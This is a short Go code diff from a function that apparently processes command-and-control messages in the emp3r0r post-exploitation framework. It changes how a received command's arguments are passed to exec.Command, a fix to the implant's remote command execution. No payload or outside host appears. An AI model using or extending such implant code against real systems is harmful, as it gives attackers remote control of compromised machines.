@@ -260,7 +260,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 				cmdSlice[0] += ".exe"
 			}
 		}
-		cmd := exec.Command(cmdSlice[0], flags.Args()...)
+		cmd := exec.Command(cmdSlice[0], cmdSlice[1:]...)
 		var out_bytes []byte
 		out_buf := bytes.NewBuffer(out_bytes)
 		cmd.Stdout = out_buf
